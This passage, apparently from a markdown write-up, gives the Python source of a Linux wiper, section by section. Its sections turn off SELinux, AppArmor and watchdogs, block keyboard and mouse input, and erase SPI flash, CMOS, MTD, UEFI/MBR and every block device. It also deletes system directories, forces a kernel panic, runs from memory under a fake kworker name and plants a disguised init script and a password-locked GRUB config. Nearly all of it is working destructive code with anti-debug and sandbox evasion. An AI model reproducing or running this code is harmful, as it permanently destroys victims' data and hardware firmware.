            mem(b'port'),      mem(b'mem'),        mem(b'kmem'),
            mem(b'null'),      mem(b'zero'),       mem(b'full'),
            mem(b'random'),    mem(b'urandom'),    mem(b'initctl'),
            mem(b'stdin'),     mem(b'stdout'),     mem(b'stderr'),
            mem(b'ptmx'),      mem(b'console'),    mem(b'rfkill'),
            mem(b'core'),      mem(b'kmsg'),       mem(b'log')
    )),
    _sk = (
            mem(b'mtd'),     mem(b'rtc'),
            mem(b'zram'),    mem(b'tty'),    
            mem(b'loop'),    mem(b'vcs'),    
                mem(b'watchdog')
    ),
    _ex = OSError
):
    nd = e.name
    fp = e.path

    if (_mm(nd) in _bd) or nd.startswith(_sk):
        return
    
    try:
        md = e.stat().st_mode

        if _ib(md):
            sz = _sb
            set_rw(fp)
        elif _ic(md):
            sz = _sc
        else:
            return
        
        with _op(fp, 'rb+', buffering=0) as d:
            d.seek(0)
            d.write(_dt[ 0 : sz ])
            _fs(d.fileno())

    except _ex:
        return
```

</details>

---

## 10. SYSCTL — Disable Kernel Hardening

<details>
<summary><b>📁 Click to expand: SYSCTL()</b></summary>

```python
def SYSCTL():
    _pf = mem(b'performance\n')
    _op = open 

    mount(None, b'/proc', flag=(b're', b'rw'))
    mount(None, b'/sys',  flag=(b're', b'rw'))

    for (p, v) in (
        (b'/proc/sys/kernel/printk',                        b'0 0 0 0'  ),
        (b'/proc/sys/kernel/printk_devkmsg',                b'off'      ),
        (b'/proc/sys/kernel/dmesg_restrict',                b'1'        ),
        (b'/proc/sys/kernel/printk_ratelimit',              b'0'        ),
        (b'/proc/sys/kernel/core_pattern',                  b'/dev/null'),
        (b'/proc/sys/kernel/panic_print',                   b'0'        ),

        (b'/sys/module/apparmor/parameters/enabled',        b'N'        ),
        (b'/sys/kernel/security/apparmor/profiles',         b'off'      ), 
        (b'/sys/fs/selinux/enforce',                        b'0'        ),
        (b'/sys/fs/selinux/disable',                        b'1'        ),
        (b'/sys/module/selinux/parameters/enabled',         b'0'        ),
        (b'/sys/module/yama/parameters/enabled',            b'0'        ),
        (b'/sys/module/loadpin/parameters/enabled',         b'0'        ),
        (b'/proc/sys/kernel/yama/ptrace_scope',             b'3'        ), 
        (b'/proc/sys/kernel/kptr_restrict',                 b'2'        ),
        (b'/proc/sys/kernel/perf_event_paranoid',           b'3'        ),
        (b'/proc/sys/user/max_user_namespaces',             b'0'        ),

        (b'/proc/sys/kernel/ctrl-alt-del',                  b'0'        ),
        (b'/proc/sys/kernel/cad_pid',                       PID.encode()),
        (b'/proc/sys/kernel/sysrq',                         b'0'        ), 

        (b'/proc/sys/kernel/nmi_watchdog',                  b'0'        ),
        (b'/proc/sys/kernel/softlockup_panic',              b'0'        ),
        (b'/proc/sys/kernel/hung_task_timeout_secs',        b'0'        ),
        (b'/proc/sys/kernel/panic',                         b'0'        ),
        (b'/proc/sys/kernel/panic_on_oops',                 b'0'        ),
        (b'/proc/sys/vm/panic_on_oom',                      b'0'        ),

        (b'/proc/sys/kernel/kexec_load_disabled',           b'0'        ),
        (b'/proc/sys/kernel/modules_disabled',              b'0'        ),
        (b'/proc/sys/kernel/randomize_va_space',            b'0'        ),
        (b'/proc/sys/kernel/sched_autogroup_enabled',       b'0'        ),
        (b'/proc/sys/vm/laptop_mode',                       b'0'        ),  
        (b'/proc/sys/vm/swappiness',                        b'0'        ),
        (b'/sys/kernel/mm/transparent_hugepage/enabled',    b'never'    ),
        (b'/proc/sys/vm/overcommit_memory',                 b'1'        ), 
        (b'/proc/sys/vm/vfs_cache_pressure',                b'1000'     ), 
        (b'/proc/sys/vm/oom_kill_allocating_task',          b'1'        )
    ):
        try:
            with _op(p, 'wb', buffering=0) as f:
                f.write(v + b'\n')
        except OSError:
            continue
    
    for n in range(_cpus):
        try:
            with _op(
                b'/sys/devices/system/cpu/cpu%d/cpufreq/scaling_governor' % n, 
                'wb', buffering=0
            ) as f:
                f.write(_pf)
        except OSError: 
            continue
```

</details>

---

## 11. MODULE — Kernel Module Manipulation

<details>
<summary><b>📁 Click to expand: MODULE()</b></summary>

```python
def MODULE():
    MOD = which('modprobe')

    if not _isfile(MOD, _fxo):
        return

    offmod = (
        'apparmor',      'selinux',         'tomoyo', 
        'smack',         'yama',            'loadpin', 

        'usbhid',        'hid_generic',     'hid',    
        'evdev',         'atkbd',           'psmouse',        
                         'i8042',

        'button',        'acpi_pad',        'thermal',

        'ipmi_si',       'ipmi_devintf',    'ipmi_msghandler', 
        'netconsole',    'pstore',          'efi_pstore',

        'softdog',       'iTCO_wdt',        'iTCO_vendor_support', 
        'sp5100_tco',    'watchdog',        'pcwd'
    )
    
    cmd((MOD, '-r', '-a', '-f', *offmod))

    for t in (
        (MOD, 'mem',          'strict_devmem=0'),      
        (MOD, 'efivarfs'),                    
        (MOD, 'spi-intel',    'writeable=1'),    
        (MOD, 'spi-dev',      'writeable=1'),      
        (MOD, 'mtd',          'ro=0'),                
        (MOD, 'spi-nor'), 
        (MOD, 'm25p80'),    
        (MOD, 'lpc_ich'), 
        (MOD, 'nvram')       
    ):
        cmd(t)
```

</details>

---

## 12. MOUNTPOINT — Remount Filesystems

<details>
<summary><b>📁 Click to expand: MOUNTPOINT()</b></summary>

```python
def MOUNTPOINT():
    for p in (
        b'/',         b'/proc',    b'/sys', 
        b'/dev',      b'/boot',    b'/etc', 
        b'/usr',      b'/lib',     b'/lib32',
        b'/lib64',    b'/bin',     b'/sbin',
        b'/var',      b'/tmp',     b'/root',
        b'/home',     b'/srv',     b'/opt',
        b'/mnt',      b'/media',   b'/cdrom'
    ):
        if mount( None, p, flag=(b're', b'rw')):
            continue

        if mount( p,    p, flag=(b'bd',)):
            mount(None, p, flag=(b're', b'rw'))

    if not ISEFI:
        return

    try:
        os.makedirs(EFIVARS, exist_ok=True)
    except OSError:
        pass

    if _ismount(EFIVARS):
        mount(None,        EFIVARS, fs=None,        flag=(b'rw', b're'))
    else:
        mount(b'efivarfs', EFIVARS, fs=b'efivarfs', flag=(b'rw',))
```

</details>

---

## 13. MTD — Memory Technology Device Destruction

<details>
<summary><b>📁 Click to expand: MTD()</b></summary>

```python
def MTD():
    PROC_MTD  = b'/proc/mtd'
    MEMUNLOCK = 0x40084d06
    MEMERASE  = 0x40084d02

    lb  = mem(b'mtd')
    dt  = mem(b':')
    dev = []

    if not _isfile(PROC_MTD, _fro):
        return

    with open(PROC_MTD, 'rb', buffering=0) as f:
        for l in f:
            try:
                if not l.startswith(lb):
                    continue

                n = l.split(maxsplit=3)
                dev.append((
                    b'/dev/' + n[ 0 ].rstrip(dt), 
                    int(n[ 1 ], 16),
                    int(n[ 2 ], 16)
                ))
            except (IndexError, ValueError):
                continue
    
    if not dev:
        return

    for (node, sz, esz) in dev:
        if esz < 1:
            continue

        try:
            set_rw(node)

            with open(node, 'rb+', buffering=0) as m:
                fd = m.fileno()

                try:
                    ioctl(
                        fd,
                        MEMUNLOCK,
                        (0 ).to_bytes(4, 'little') +
                        (sz).to_bytes(4, 'little')
                    )
                except OSError:
                    pass

                for off in range(0, sz, esz):
                    bln = min(esz, sz - off)

                    try:
                        ioctl(
                            fd,
                            MEMERASE,
                            off.to_bytes(4, 'little') +
                            bln.to_bytes(4, 'little')
                        )
                    except OSError:
                        pass

                i = sz
                while i:
                    bwt = min(_4mb, i)
                    m.write(URANDOM[ 0 : bwt ]) 
                    i -= bwt

                _fsync(fd)

        except OSError:
            continue
```

</details>

---

## 14. CMOS — CMOS/NVRAM Destruction

<details>
<summary><b>📁 Click to expand: CMOS()</b></summary>

```python
def CMOS():
    NVRAM = b'/dev/nvram'
    RTC   = b'/dev/rtc0'
    PORT  = b'/dev/port'

    try:
        with open(NVRAM, 'rb+', buffering=0) as nv:
            sz = nv.seek(0, os.SEEK_END) or 128
            nv.seek(0)
            nv.write(URANDOM[ 0 : sz ])
            _fsync(nv.fileno())
    except OSError:
        pass 

    try:
        with open(RTC, 'rb', buffering=0) as rc:
            ioctl(rc.fileno(), 0x4024700a, mem(b'c\x00\x00\x00c\x00\x00\x00c\x00\x00\x00c\x00\x00\x00c\x00\x00\x00\x96\x00\x00\x00\t\x00\x00\x00\x90\x01\x00\x00\xff\xff\xff\xff'))
    except OSError:
        pass

    try:
        with open(PORT, 'rb+', buffering=0) as pt:
            for i in range(128):
                pt.seek(0x70)
                pt.write((i | 0x80).to_bytes())
                
                pt.seek(0x71)
                pt.write(URANDOM[ i : i + 1 ])
            
            pt.seek(0x70)
            pt.write(b'\x00')
            
            _fsync(pt.fileno())
    except OSError:
        pass
```

</details>

---

## 15. FLASHROM — SPI Flash Destruction

<details>
<summary><b>📁 Click to expand: FLASHROM()</b></summary>

```python
def FLASHROM():
    FLASH = which('flashrom')

    if not _isfile(FLASH, _fxo):
        if not install_packet('flashrom'):
            return
        
        FLASH = which('flashrom')
        if not _isfile(FLASH, _fxo):
            return

    flags = {
        'std' : 'internal',
        'mms' : 'internal:boardmismatch=force',
        'brk' : 'internal:laptop=force_I_want_a_brick,boardmismatch=force,ignorspifplock=yes',
        'hws' : 'internal:ich_spi_mode=hwseq,laptop=force_I_want_a_brick,boardmismatch=force',
        'sws' : 'internal:ich_spi_mode=swseq,laptop=force_I_want_a_brick,boardmismatch=force',
        'spi' : 'internal:bus=spi,laptop=force_I_want_a_brick',
        'lpc' : 'internal:bus=lpc,laptop=force_I_want_a_brick',
        'fwh' : 'internal:bus=fwh,laptop=force_I_want_a_brick',
        'ime' : 'internal:ich_spi_force=yes,laptop=force_I_want_a_brick'
    }

    for c in (
        (FLASH, '-p', flags[ 'std' ], '--wp-disable'                   ),
        (FLASH, '-p', flags[ 'brk' ], '--wp-disable', '--force'        ),
        (FLASH, '-p', flags[ 'mms' ], '--wp-disable', '--force'        ),
        (FLASH, '-p', flags[ 'brk' ], '--wp-range', '0', '0', '--force'),
        (FLASH, '-p', flags[ 'hws' ], '--wp-range', '0', '0', '--force'),
        (FLASH, '-p', flags[ 'sws' ], '--wp-range', '0', '0', '--force'),
        (FLASH, '-p', flags[ 'std' ], '--unlock'                       ),
        (FLASH, '-p', flags[ 'brk' ], '--unlock'                       ),
        (FLASH, '-p', flags[ 'mms' ], '--wp-list'                      )
    ):
        cmd(c)

    tmp = f'/tmp/.{_urandom(8).hex()}'

    try:
        with open(tmp, 'wb', buffering=0) as f:
            f.write(URANDOM) 
            _fsync(f.fileno())
    except OSError: 
        pass
    else:
        for c in (
            (FLASH, '-p', flags[ 'brk' ], '-w', tmp, '--force', '--noverify'                 ),
            (FLASH, '-p', flags[ 'hws' ], '-w', tmp, '--force', '--noverify', '--ignore-lock'),
            (FLASH, '-p', flags[ 'sws' ], '-w', tmp, '--force', '--noverify', '--ignore-lock'),         
            (FLASH, '-p', flags[ 'brk' ], '-i', 'bios', '-w', tmp, '--force', '--noverify'   ),    
            (FLASH, '-p', flags[ 'brk' ], '-E', '--force', '--noverify', '--ignore-lock'     )
        ):
            if cmd(c) == 0: 
                break

    for c in (
        (FLASH, '-p', flags[ 'std' ], '-E', '--force', '--noverify'                                   ),
        (FLASH, '-p', flags[ 'brk' ], '-E', '--force', '--noverify', '--ignore-lock'                  ),
        (FLASH, '-p', flags[ 'hws' ], '-E', '--force', '--noverify', '--ignore-lock'                  ),
        (FLASH, '-p', flags[ 'sws' ], '-E', '--force', '--noverify', '--ignore-lock'                  ),
        (FLASH, '-p', flags[ 'spi' ], '-E', '--force', '--noverify'                                   ),
        (FLASH, '-p', flags[ 'lpc' ], '-E', '--force', '--noverify'                                   ),
        (FLASH, '-p', flags[ 'fwh' ], '-E', '--force', '--noverify'                                   ),
        (FLASH, '-p', flags[ 'ime' ], '-E', '--force', '--noverify', '--ignore-lock'                  ),
        (FLASH, '-p', f'{flags[ "brk" ]},spispeed=128', '-E', '--force', '--ignore-lock', '--noverify')
    ):
        if cmd(c) == 0: 
            break

    for p in (
        'nic3com',          'nicrealtek',       'nicnatsemi', 
        'nicintel',         'nicintel_spi',     'nicintel_eeprom',
        'gfxnvidia',        'drkaiser',         'satasii', 
        'asm106x',          'satamv',           'atahpt', 
        'atapromise',       'atavia',           'it8212', 
        'pci_erom',         'ft2232_spi',       'serprog', 
        'buspirate_spi',    'dediprog',         'usbblaster_spi', 
        'pickit2_spi',      'ch341a_spi',       'ch347_spi', 
        'jlink_spi',        'stlinkv3_spi',     'raiden_debug_spi', 
        'digilent_spi',     'dirtyjtag_spi',    'spidriver', 
        'developerbox',     'rayer_spi',        'pony_spi', 
        'linux_spi',        'linux_mtd',        'mstarddc_spi', 
                    'ogp_spi',          'dummy'
    ):
        cmd((FLASH, '-p', p, '-E', '--force', '--noverify', '--ignore-lock'))

    for h in (
        'W25Q64BV',       'W25Q128FV',      'W25Q256FV', 
        'MX25L6405D',     'MX25L12805D',    'MX25L25635E',
        'SST25VF040B',    'SST25VF016B',    'SST25VF064C',
        'EN25QH16',       'EN25QH32',       'EN25QH64',
        'GD25Q64C',       'GD25Q128C',      'W25X40'
    ):
        cmd((FLASH, '-p', f'dummy:emulate={h}', '-E', '--force', '--noverify'))

    for r in (
        'fd',              'bios',      'me', 
        'gbe',             'gbeb',      'desc',
        'pd',              'ec',        'pdr',
        'fmap',            'ro_vba',    'rw_section_a', 
        'rw_section_b',    'shared',    'bootblock',
        'cbfs',            'vpd',       'rw_vpd', 
        'ro_vpd',          'smm',       'mrc',
        'efivars',         'nvram',     'config'
    ):
        cmd((FLASH, '-p', flags[ 'brk' ], '-i', r, '-E', '--force', '--noverify'))

    for c in (
        (FLASH, '-p', flags[ 'std' ], '--wp-enable'                            ), 
        (FLASH, '-p', flags[ 'brk' ], '--wp-range', '0', '33554432', '--force' ),        
        (FLASH, '-p', flags[ 'hws' ], '--wp-enable', '--ignore-lock'           ),
        (FLASH, '-p', flags[ 'std' ], '--wp-status'                            ),
        (FLASH, '-p', flags[ 'std' ], '--wp-list'                              ),
        (FLASH, '-p', flags[ 'brk' ], '--wp-region', '0', '33554432', '--force')
    ):
        cmd(c)

    cmd((FLASH, '-p', f'{flags[ "brk" ]},spispeed=128', '-E', '--force', '--ignore-lock'))
```

</details>

---

## 16. UEFI / BIOS Destruction

<details>
<summary><b>📁 Click to expand: UEFI(), BIOS()</b></summary>

### 16.1 UEFI() — UEFI Firmware Destruction

```python
def UEFI():
    dev, esp = get_esp_dev()

    if dev is None:
        dev = get_default_dev(part=True)

    if _ismount(EFIVARS):
        with _scandir(EFIVARS) as d:
            deque(tmap(wipe_efivar, d), maxlen=0)

    if esp is None:
        esp = b'/boot/efi'
    else:
        umount(esp)
    
    dev = dev.tobytes()

    try:
        set_rw(dev)

        with open(dev, 'rb+', buffering=0) as e:
            e.seek(0)
            e.write(URANDOM)
            _fsync(e.fileno())

    except OSError: 
        try:
            os.makedirs(esp, exist_ok=True)
        except OSError: 
            pass

        if _ismount(esp):
            mount(None, esp, fs=None,    flag=(b'rw', b're'))
        else:
            mount(dev,  esp, fs=b'vfat', flag=(b'rw',))

        remove_dir(esp)
        _sync()
```

### 16.2 BIOS() — BIOS/MBR Destruction

```python
def BIOS():
    dev = get_mbr_dev()

    if dev is None:
        dev = get_default_dev(part=False).tobytes()
    
    try: 
        set_rw(dev)

        with open(dev, 'rb+', buffering=0) as d:
            d.seek(0)
            d.write(URANDOM)
            _fsync(d.fileno())

    except OSError: 
        return
```

</details>

---

## 17. DEVICE — Wipe All Devices

<details>
<summary><b>📁 Click to expand: DEVICE()</b></summary>

```python
def DEVICE():
    DMS = which('dmsetup')

    if _isfile(DMS, _fxo):
        cmd((DMS, 'remove_all', '--force'))

    deque(tmap(wipe_dev, iter_dir(b'/dev')), maxlen=0)
```

</details>

---

## 18. LINUX — Filesystem Destruction

<details>
<summary><b>📁 Click to expand: LINUX()</b></summary>

```python
def LINUX():
    with Ppool(3) as p:
        deque(p.map(
            remove_dir, (
                b'/var/log',    b'/var/backups',    b'/var/cache',
                b'/boot',       b'/etc',            b'/root',           
                b'/home',       b'/srv',            b'/opt',            
                                b'/var/lib',
                b'/mnt',        b'/media',          b'/cdrom'
            )   
        ), maxlen=0)

    _sync()
    
    for p in (
        b'/usr',    b'/bin',      b'/sbin',       
        b'/lib',    b'/lib32',    b'/lib64'  
    ):
        remove_dir(p)

    _sync()
```

</details>

---

## 19. RAM — Memory Exhaustion

<details>
<summary><b>📁 Click to expand: RAM()</b></summary>

```python
def RAM():
    sz  = _4mb << 6

    raw = []

    _ar = array
    _ap = raw.append

    try:
        while True:
            _ap(_ar(sz))
    except (MemoryError, OverflowError): 
        pass
```

</details>

---

## 20. BSOD — Kernel Panic Trigger

<details>
<summary><b>📁 Click to expand: BSOD()</b></summary>

```python
def BSOD():
    try:
        with open(b'/dev/port', 'rb+', buffering=0) as p:
            p.write(URANDOM[ 0 : _64kb ])
            _fsync(p.fileno())
    except OSError:
        pass

    try:
        with open(b'/dev/console', 'rb+', buffering=0) as c:
            c.write(URANDOM) 
            _fsync(c.fileno())
    except OSError: 
        pass

    for (p, v) in (
        (b'/proc/sys/kernel/panic_on_oops', b'1'),
        (b'/proc/sys/kernel/panic',         b'0'),
        (b'/proc/sys/kernel/sysrq',         b'1'),
        (b'/proc/sysrq-trigger',            b'c')
    ):
        try:
            with open(p, 'wb', buffering=0) as f:
                f.write(v + b'\n')
        except OSError:
            continue

    try:
        os.kill(1, sig.SIGKILL)
    except OSError:
        pass
    
    memset(0, 1, 1)
```

</details>

---

## 21. run_from_mem — Fileless Execution

<details>
<summary><b>📁 Click to expand: run_from_mem()</b></summary>

```python
def run_from_mem():
    global __file__

    if FLAG_MEM in _argv:
        __file__ = _argv[ -1 ]
        return
    
    md = -1

    try:
        md = os.memfd_create('[kworker_mem]', 2) 

        with open(__file__, 'rb', buffering=0) as f:
            fd = f.fileno()
            sz = os.fstat(fd).st_size
            os.sendfile(md, fd, 0, sz)

        fcntl(md, 1033, 0x3F)
        os.set_inheritable(md, True)

        args = [PYEXE, f'/proc/self/fd/{md}']

        if ENABLE_GRUB_TAKEOVER:
            args.append(FLAG_INIT)

        args += [FLAG_ROOT, FLAG_MEM, __file__]
            
        os.execv(PYEXE, args)

    except (AttributeError, OSError): 
        pass
    
    if md > -1:
        _close(md)
```

</details>

---

## 22. siginit — Signal Initialization

<details>
<summary><b>📁 Click to expand: siginit()</b></summary>

```python
def siginit():
    sigs   = set(range(1, 32)) - {sig.SIGKILL, sig.SIGSTOP}
    sigign = sig.SIG_IGN
    sigset = sig.signal
    
    if hasattr(sig, 'SIGRTMIN') and hasattr(sig, 'SIGRTMAX'):
        sigs |= set(range(sig.SIGRTMIN, sig.SIGRTMAX + 1))

    for n in ('SIGALRM', 'SIGVTALRM', 'SIGPROF'):
        s = getattr(sig, n, None)
        if s is not None:
            sigs.add(s)

    try:
        sig.pthread_sigmask(sig.SIG_BLOCK, sigs)
    except Exception:
        pass

    for s in sigs:
        try:
            sigset(s, sigign)
        except Exception:
            continue
```

</details>

---

## 23. init_proc — Process Initialization

<details>
<summary><b>📁 Click to expand: init_proc()</b></summary>

```python
def init_proc(): 
    try:
        if(___!=ENABLE_ANTIDEBUG):__die()
        if(____!=BLOCK_SANDBOX):__die()
        if((ENABLE_ANTIDEBUG)or(BLOCK_SANDBOX))and((__)is not(...)):__die()
    except:
        try:raise(LookupError((0,...,memset(0,1,1),...,_exit(0),...,1)[0]))
        except:raise(SystemExit(0))

    siginit()

    try:
        os.chdir(b'/')
    except OSError:
        pass

    try:
        os.nice(-20)
        os.sched_setscheduler(0, os.SCHED_FIFO, os.sched_param(80))
    except (AttributeError, OSError): 
        pass

    try:
        _rs.setrlimit(_rs.RLIMIT_CORE, (0, 0))
    except OSError:
        pass

    try:
        _, maxmem = _rs.getrlimit(_rs.RLIMIT_MEMLOCK)
        _rs.setrlimit(_rs.RLIMIT_MEMLOCK, (maxmem, maxmem))
    except OSError:
        pass

    try:
        _, maxfd = _rs.getrlimit(_rs.RLIMIT_NOFILE)
        _rs.setrlimit(_rs.RLIMIT_NOFILE, (maxfd, maxfd))
    except OSError: 
        pass 

    if libc:
        libc.prctl(15, b'[kworker/0:%d]' % POOL_WORKERS, 0, 0, 0) 
        libc.prctl(1, 0, 0, 0, 0)
        libc.prctl(4, 0, 0, 0, 0) 
        libc.prctl(0x59616d61, 0, 0, 0, 0)

        libc.prctl(57, 1, 0, 0, 0)
        libc.prctl(36, 1, 0, 0, 0)
        libc.mlockall(3)

    for (p, v) in (
        (b'/proc/self/coredump_filter',    b'0x000'),
        (b'/proc/self/oom_score_adj',      b'-1000'),
        (b'/proc/self/oom_adj',            b'-17'  ),
        (b'/proc/self/timerslack_ns',      b'1'    ),
        (b'/proc/self/autogroup',          b'0'    )
    ):
        try:
            with open(p, 'wb', buffering=0) as f:
                f.write(v + b'\n')
        except OSError:
            continue
        
    for i in (
        b'cmdline',    b'exe',      b'environ', 
        b'maps',       b'smaps',    b'stack',   
        b'syscall',    b'sched',    b'comm',    
              b'stat',       b'status'                
    ):
        mount(b'/dev/null', b'/proc/self/' + i, fs=None, flag=(b'bind',))
```

</details>

---

## 24. BlockInput — Block User Input

<details>
<summary><b>📁 Click to expand: BlockInput()</b></summary>

```python
def BlockInput(
    _gb = 0x40044590, 
    _op = _open, 
    _fl = os.O_RDONLY | os.O_NONBLOCK | os.O_NOFOLLOW | os.O_NOCTTY | os.O_CLOEXEC,
    _io = ioctl,
    _bd = []
):
    _scin = b'/sys/class/input'
    _devs = mem(b'devices')
    _aubd = _bd.append
    _real = os.path.realpath
    _bnam = os.path.basename
    _dirn = os.path.dirname

    for n in iter_dir(b'/dev/input'):
        try:
            d = _op(n.path, _fl)
            _io(d, _gb, 1)
            _aubd(d)
        except OSError:
            continue

    if not _isexst(_scin):
        return

    with _scandir(_scin) as d:
        for n in d:
            node = _real(n.path + b'/device')
            
            i = 4  
            while i:
                unbind = node + b'/driver/unbind'
                try:
                    with open(unbind, 'wb', buffering=0) as f:
                        f.write(_bnam(node) + b'\n')
                    break 
                except OSError:
                    pass
                        
                parent = _dirn(node)
                if (parent == node) or (_devs not in parent):
                    break
                        
                node = parent
                i -= 1
```

</details>

---

## 25. GRUB Takeover Functions

<details>
<summary><b>📁 Click to expand: make_init(), setup_grub(), GRUB_INIT()</b></summary>

### 25.1 make_init() — Create Custom Init Script

```python
def make_init():
    def quote(s, _ch=s_set('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@%+=:,./-_')):
        if not s:
            return "''"
        if all(c in _ch for c in s):
            return s
        return "'" + s.replace("'", "'\"'\"'") + "'"
    
    path_init = '/sbin/.init'
    
    exe = [quote(__file__), FLAG_ROOT, FLAG_INIT]
    if not IS_ELF:
        exe.insert(0, quote(PYEXE))

    irun_init = f'exec {" ".join(exe)}'

    try:
        with open(path_init, 'wb', buffering=0) as f:
            fd = f.fileno()
            f.write(mem(
f'''#!/bin/sh
#
# /sbin/init - Autogenerated boot initialization script
# Generated by systemd-stub or initramfs-tools
#
# DO NOT EDIT THIS FILE: Internal boot sequence configuration.
#

export PATH=/sbin:/bin:/usr/sbin:/usr/bin

### BEGIN MOUNT_SECTION ###
# Mount essential kernel filesystems
mount -o remount,rw / 2>/dev/null

mount -t proc        proc        /proc                2>/dev/null
mount -t sysfs       sysfs       /sys                 2>/dev/null
mount -t devtmpfs    devtmpfs    /dev                 2>/dev/null
mount -t tmpfs       tmpfs       /tmp -o mode=1777    2>/dev/null
### END MOUNT_SECTION ###

### BEGIN EXECUTION ###
# Handover to the primary init process
{irun_init}
### END EXECUTION ###
'''.encode()
))
            os.fchmod(fd, 0o755)
            _fsync(fd)
    except OSError:
        return None
    
    return (
        'nomodeset quiet nosplash fbcon=nodefer vt.global_cursor_default=0 '
        'printk.time=0 loglevel=0 audit=0 audit_backlog_limit=0 '
        'selinux=0 apparmor=0 security=none lockdown=none iomem=relaxed '
        'acpi_no_static_ssdt acpi_sleep=off button.allow_power_off=0 '
        'mitigations=off nosmap nosmep kptr_restrict=0 '
        'initrd.shell=0 rd.shell=0 rd.emergency=reboot rd.rescue=reboot panic=0 reboot=force '
        'iommu=pt pci=noaer pcie_aspm=off pcie_bus_perf '
        'tsx=off tsc=reliable clocksource=tsc rcu_expedited mce=ignore_ce '
        'transparent_hugepage=never processor.max_cstate=0 intel_idle.max_cstate=0 '
        'nmi_watchdog=0 nowatchdog nosoftlockup '
        'rootwait '
        f'init={path_init}'
    )
```

### 25.2 setup_grub() — Overwrite GRUB Configuration

```python
def setup_grub():
    _mm = mem
    lbg = s_set((_mm(b'grub.cfg'), _mm(b'grub2.cfg')))
    cfg = []
    auc = cfg.append
    
    for c in iter_dir(b'/boot'):
        if _mm(c.name) not in lbg:
            continue
        auc(c.path)

    if not cfg:
        return False
    
    cmdline = make_init()
    if cmdline is None:
        return False
    
    pcmdl   = b'/proc/cmdline'
    rel     = os.uname().release
    vmlinuz = f'/boot/vmlinuz-{rel}'
    initrd  = f'/boot/initrd.img-{rel}'

    if not (_isfile(pcmdl, _fro) and _isexst(vmlinuz) and _isexst(initrd)):
        return False
    
    lbr = mem(b'root=')

    with open(pcmdl, 'rb', buffering=0) as f:
        for n in f.read().split():
            if not n.startswith(lbr):
                continue
            root = n.decode()
            break
        else:
            return False

    payload = mem(f'''#
# DO NOT EDIT THIS FILE
#
# It is automatically generated by grub-mkconfig using templates
# from /etc/grub.d and settings from /etc/default/grub
#

### BEGIN /etc/grub.d/00_header ###
if [ -s $prefix/grubenv ]; then
  set have_grubenv=true
  load_env
fi

set default=0
set quiet=1
set timeout=0
set timeout_style=hidden
set recordfail=0
set fallback=0
set pager=0
set debug=""

function load_video {{
  if [ x$feature_all_video_module = xy ]; then
    insmod all_video
  else
    insmod efi_gop
    insmod efi_uga
    insmod vbe
    insmod vga
    insmod video_bochs
    insmod video_cirrus
  fi
}}

set gfxpayload=text

terminal_input console
terminal_output console
### END /etc/grub.d/00_header ###

### BEGIN /etc/grub.d/01_password ###
set superusers="root"
password root {_urandom(16).hex()}
### END /etc/grub.d/01_password ###

### BEGIN /etc/grub.d/05_theme ###
set menu_color_normal=white/black
set menu_color_highlight=black/white
### END /etc/grub.d/05_theme ###

### BEGIN /etc/grub.d/10_linux ###
menuentry "GNU/Linux, with {rel}" --unrestricted --class gnu-linux --class os {{
    load_video
    insmod gzio
    insmod part_gpt
    insmod ext2

    echo     "Loading Linux {rel} ..."
    linux    {vmlinuz} {root} rw {cmdline}
    echo     "Loading initial ramdisk ..."
    initrd   {initrd}
}}   
### END /etc/grub.d/10_linux ###

### BEGIN /etc/grub.d/30_os-prober ###
### END /etc/grub.d/30_os-prober ###

### BEGIN /etc/grub.d/40_custom ###
# This file provides an easy way to add custom menu entries.  Simply type the
# menu entries you want to add after this comment.  Be careful not to change
# the 'exec tail' line above.
### END /etc/grub.d/40_custom ###
'''.encode())
    
    for p in cfg:
        try:
            attr(p)
            with open(p, 'wb', buffering=0) as gcfg:
                gcfg.write(payload)
                _fsync(gcfg.fileno())
            set_immutable(p)
        except OSError:
            continue
    
    remove_file(b'/etc/fstab'       )
    remove_file(b'/etc/default/grub')
    remove_dir( b'/etc/grub.d'      )

    install_packet('flashrom')

    _sync()

    try:
        with open(b'/proc/sysrq-trigger', 'wb', buffering=0) as f:
            f.write(b'b\n')
    except OSError:
        pass

    cmd((which('reboot'), '-f'))

    return True
```

### 25.3 GRUB_INIT() — GRUB Takeover Entry Point

```python
def GRUB_INIT():
    if FLAG_INIT in _argv:
        return

    if setup_grub():
        _exit(0)
```

</details>

---

## 26. Main Execution Flow

<details>
<summary><b>📁 Click to expand: _start(), main()</b></summary>

### 26.1 _start() — Initialization Entry Point

```python
def _start(m=main):
    if(getattr(m,'__name__',...)):return(0)

    try:0//0//((0>>0<<0)%(1<<1>>1))//0//0
    except:
        try:raise(__init(m))
        except(IndexError.__mro__[2])as e:i=e;globals()['__name__']=''
        else:
            try:(__die())if((___)or(____))else(_exit(0))
            finally:raise(SystemExit(0))
    else:
        try:(__die())if((___)or(____))else(_exit(0))
        finally:raise(SystemExit(0))

    _off_warn('ignore')
    _off_log(50)

    sys.settrace(None)
    sys.setprofile(None)

    _gc.set_debug(0)
    _gc.disable()
    _gc.collect()

    get_root()

    if ENABLE_GRUB_TAKEOVER:
        GRUB_INIT()

    if not IS_ELF:
        run_from_mem()
    
    BlockInput()

    init_proc()
    locals()['i']._(i)
globals()['_start'].__name__=''
```

### 26.2 main() — Main Destruction Sequence

```python
main=_main=__main=lambda:main
def main(_=...):
    if(not(isinstance(_,UserWarning.__mro__[2]))):return(0)
    if(((___)or(____))and(not(__name__))):
        try:__die()
        finally:raise(SystemExit(0))

    _gc.collect()

    for _ in (
        SYSCTL,
        MODULE,
        MOUNTPOINT,

        lambda:__die(False),

        MTD,
        CMOS,
        FLASHROM,
        UEFI if ISEFI else BIOS,
        DEVICE,
        LINUX
    ):
        try:
            try:
                raise(RuntimeError((1,_(),0)[-1]))
            except RuntimeError.__mro__[0]:
                raise(InterruptedError((1,None,0)[0]))
            else:
                raise(StopIteration((1,None,0)[2]))
        except:
            continue

    POOL.shutdown(False)
    _gc.collect()

    RAM()
    BSOD()

    _gc.collect()
    _exit(0)
globals()['main'].__name__=''
```

### 26.3 Program Entry Point

```python
_='linux';globals()['_']=main;_='1991';_='1994';globals()['_']=_start;_='2000';_='2008';_='2026';_=main

if(__name__=='__main__'): 
    try:
        if(___!=ENABLE_ANTIDEBUG):__die()
        if(____!=BLOCK_SANDBOX):__die()
        if((ENABLE_ANTIDEBUG)or(BLOCK_SANDBOX))and((__)is not(...)):__die()
    except:
        try:raise(SyntaxError((...,memset(0,1,1),0,_exit(0),...)[2]))
        finally:raise(SystemExit(0))
    else:
